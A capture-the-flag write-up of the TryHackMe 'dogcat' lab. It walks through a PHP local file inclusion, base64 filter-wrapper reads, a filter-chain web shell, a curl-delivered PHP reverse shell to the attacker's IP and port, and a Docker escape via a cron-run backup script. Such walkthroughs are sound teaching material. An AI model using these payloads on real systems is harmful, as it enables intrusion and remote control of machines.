# dogcat

https://tryhackme.com/room/dogcat

## Scan

We discover 2 ports (ssh and http)

![image](https://github.com/Roqlane/writeups/assets/78229498/0706358e-69c6-4d42-a1a3-a10ea209d386)

## Website

![image](https://github.com/Roqlane/writeups/assets/78229498/06bd7de1-dbd0-4c61-abeb-57df39a69a12)

So this is a site where you can see pictures of dogs and cats. Pretty nice! I am thinking of just looking at them instead of completing the chall XD

Hmmmm interesting result, seems like we got an lfi.

![image](https://github.com/Roqlane/writeups/assets/78229498/4673de48-4870-42c0-ad2e-173105a7a334)

This LFI is pretty tricky, I think the code behind it is like so:

`include ($file . ".php")`

To get the first flag, I first needed to perform an enum using gobuster:

`gobuster dir -u "http://10.10.242.241" -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php, .txt`

Then I discovered that there is a flag.php file. I tried to access it but it didn't print out any results. So we need a way to get its content. For that I use a payload from that article https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md.

Put it on practice: 

`http://10.10.17.47/?view=php://filter/convert.base64-encode/resource=cats/../../../../var/www/html/flag`

Got a base64 response so I used cyberchef to decode it

![image](https://github.com/Roqlane/writeups/assets/78229498/41946361-1ec4-4313-8a4a-9c80952ac182)

## Web shell

Now we have to use another wrapper to execute shell commands. After some search, I found that I could use the filter wrapper (thx to this site: https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams) and this python script to make the exploit https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py

![image](https://github.com/Roqlane/writeups/assets/78229498/9363c59d-214b-4d65-8fda-b02944433f4e)

I put the result in the FILTERS variable

![image](https://github.com/Roqlane/writeups/assets/78229498/029728ae-1bef-4cd0-8828-0363ed980874)

Execute `ls%20..%2F` on the cmd param and you found out that there is the second flag

![image](https://github.com/Roqlane/writeups/assets/78229498/bc106a42-7a8e-4b8a-af42-a2b526eda277)

![image](https://github.com/Roqlane/writeups/assets/78229498/1ce01b76-9738-4661-b1d3-e9dc2d061995)

## Reverse shell

`curl "http://10.10.17.47/?view=php://filter/$FILTERS/resource=cat&cmd=php%20-r%20'%24sock%3Dfsockopen(%2210.9.164.243%22%2C6969)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B'" --output result`

![image](https://github.com/Roqlane/writeups/assets/78229498/2fe4aa6a-e835-4bd8-aedd-88a0c4fc328e)

## privesc

Well...

![image](https://github.com/Roqlane/writeups/assets/78229498/a4c4198b-a6e0-4ab8-921a-b20e20f2ccca)

Or

![image](https://github.com/Roqlane/writeups/assets/78229498/8a6244f8-36b7-42ef-b848-36f04b8dd329)

![image](https://github.com/Roqlane/writeups/assets/78229498/b8083628-f747-46d3-841c-574ed560bbd6)

If I remember well, we are in a docker container, let's use this: https://github.com/stealthcopter/deepce

![image](https://github.com/Roqlane/writeups/assets/78229498/eeec3090-f522-474c-a816-29f5d9ca38c3)

![image](https://github.com/Roqlane/writeups/assets/78229498/38aba1ee-a112-4557-bf46-3ad68b5986e4)

![image](https://github.com/Roqlane/writeups/assets/78229498/a46bb9aa-97e2-4d04-8069-d0f6925e9a3a)


Well I passed a lot of time searching for docker escape, only to find out that the backup.sh file is executed as a cron job......
That surely means that the host is executing the file, so if we add a reverse shell to the file, we could access the host system.

![image](https://github.com/Roqlane/writeups/assets/78229498/7776b43b-65c8-4228-94bb-c54753145cad)

![image](https://github.com/Roqlane/writeups/assets/78229498/ff121d3e-86d4-49a5-842d-811c2ce13ac8)

I searched for a docker escape but it was a cron job all this time XD. 
